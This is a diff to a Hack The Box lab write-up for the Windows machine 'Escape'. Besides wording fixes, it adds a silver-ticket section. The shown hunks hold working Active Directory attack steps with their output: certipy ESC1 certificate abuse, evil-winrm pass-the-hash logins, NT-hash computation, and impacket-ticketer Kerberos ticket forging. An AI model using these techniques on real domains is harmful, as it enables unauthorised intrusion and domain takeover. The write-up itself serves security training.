@@ -2,13 +2,13 @@
 
 ## Overview
 
-A Windows machine created by [Geiseric](https://app.hackthebox.com/users/184611) features techniques relating to
+A Windows machine created by [Geiseric](https://app.hackthebox.com/users/184611) features techniques including:
 
 * Active Directory
-* MSSQL Server
-* UNC Path Injection
+* MSSQL Server UNC Path Injection
 * Credentials Harvest
 * Misconfigured Certificate Templates
+* Silver Ticket Attack
 
 ## Reconnaissance
 
@@ -248,9 +248,9 @@ $ bloodhound-python -u SQL_SVC -p REGGIE1234ronnie -d sequel.htb -v -ns <IP>
 {% endtab %}
 {% endtabs %}
 
-### Credential Hunting
+### User Ryan.Cooper
 
-We found a MSSQL log file `C:\SQLServer\Logs\ERRORLOG.BAK`.
+We found an MSSQL log file `C:\SQLServer\Logs\ERRORLOG.BAK`.
 
 ```powershell
 *Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK
@@ -261,8 +261,6 @@ We found a MSSQL log file `C:\SQLServer\Logs\ERRORLOG.BAK`.
 2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
 ...
 ```
-
-### User Ryan.Cooper
 
 We see the user `Ryan.Cooper` type his password incorrectly and we can try to login to the target using this password now.
 
@@ -311,11 +309,11 @@ See [Certified Pre-Owned](../../windows/credential-access/certified-pre-owned.md
 
 ### Technique ESC1
 
-Users obtain certificates from CA through the [_certificate enrollment process_](../../windows/ad/certificate-service.md#certificate-enrollment). Some misconfiguration may result in the domain escalation.
+Users obtain certificates from CA through the [_certificate enrollment process_](../../windows/ad/certificate-service.md#certificate-enrollment). Some misconfiguration may result in domain escalation.
 
 {% embed url="https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Active-Directory-Certificate-Services" %}
 
-We can use the tool `Certify.exe` to enumerate misconfigured certificate template.
+We can use the tool `Certify.exe` to enumerate misconfigured certificate templates.
 
 {% embed url="https://github.com/GhostPack/Certify#compile-instructions" %}
 
@@ -396,7 +394,7 @@ Certificate Templates
 
 ### Certificate Signing Request
 
-We can now use `certipy` to request the certificate for user `administrator` now.
+We can now use `certipy` to request the certificate for the user `administrator` now.
 
 {% code overflow="wrap" %}
 ```bash
@@ -431,7 +429,7 @@ Certipy v4.4.0 - by Oliver Lyak (ly4k)
 ```
 {% endcode %}
 
-And, we can login using `evil-winrm` now.
+And, we can login to the target using `evil-winrm` now.
 
 ```bash
 $ evil-winrm -i escape -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
@@ -442,4 +440,72 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 sequel\administrator
+```
+
+## Miscellaneous
+
+### Silver Ticket Attack
+
+Since we got the password of the service account `SQL_SVC`, we can mint a service-granting ticket for a non-existing SPN using the password hash as in a [silver ticket attack](../../windows/credential-access/kerberos-ticket/golden-silver-ticket-attack.md).
+
+First, we need the domain SID, in our case `S-1-5-21-4078382237-1492182817-2568127209`:
+
+```bash
+$ evil-winrm -u sql_svc -i escape -p REGGIE1234ronnie
+...
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ==============================================
+sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106
+...
+```
+
+We also need the NT-hash `1443ec19da4dac4ffc953bca1b57b4cf`:
+
+```python
+from Cryptodome.Hash import MD4
+from binascii import hexlify
+
+password = 'REGGIE1234ronnie'
+hash = MD4.new()
+hash.update(password.encode('utf_16le'))
+print(hexlify(hash.digest()).upper())
+```
+
+We can mint the TGS for the user `Administrator` using Impacket's `ticketer` with a non-existing SPN without touching the DC now.
+
+{% code overflow="wrap" %}
+```bash
+$ impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip escape -spn MSSQL/DC.SEQUEL.HTB Administrator
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sequel.htb/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+```
+{% endcode %}
+
+We can now login the MSSQL service using the account `administrator` now.
+
+```bash
+$ export KRB5CCNAME=Administrator.ccache
+$ impacket-mssqlclient -k dc.sequel.htb
+...
+SQL> select suser_name()
+                       
+--------------------   
+sequel\Administrator 
 ```
